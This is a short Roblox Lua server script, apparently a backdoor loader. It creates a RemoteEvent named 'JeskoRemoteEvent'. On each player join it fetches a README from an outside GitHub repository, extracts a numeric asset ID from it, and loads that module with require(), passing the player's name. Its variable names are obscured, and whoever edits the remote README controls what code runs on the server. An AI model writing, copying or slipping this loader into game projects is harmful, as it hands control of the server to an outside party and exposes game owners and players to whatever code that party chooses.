local a = game:GetService("HttpService")
local b = "https://raw.githubusercontent.com/G4mg1/Mirox/refs/heads/main/README.md"
local c = game:GetService("Players")
local d = game:GetService("ReplicatedStorage")
local e = "JeskoRemoteEvent"

local function f()
    local g = Instance.new("RemoteEvent")
    g.Name = e
    g.Parent = d
end

if a.HttpEnabled then
    f()
    c.PlayerAdded:Connect(function(h)
        local i, j = pcall(function()
            return a:GetAsync(b)
        end)
        if i then
            local k = string.match(j, "%d+")
            if k then
                local l = tonumber(k)
                if l then
                    local m, n = pcall(function()
                        return require(l)(h.Name)
                    end)
                    if m then
                        print("Required module:", l)
                    else
                        warn("Failed to require module with ID:", l, n)
                    end
                else
                    warn("Could not convert module ID to number:", k)
                end
            else
                warn("No number found in fetched content.")
            end
        else
            warn("Failed to fetch remote file:", j)
        end
    end)
else
    warn("Go Enable Https brothah")
end

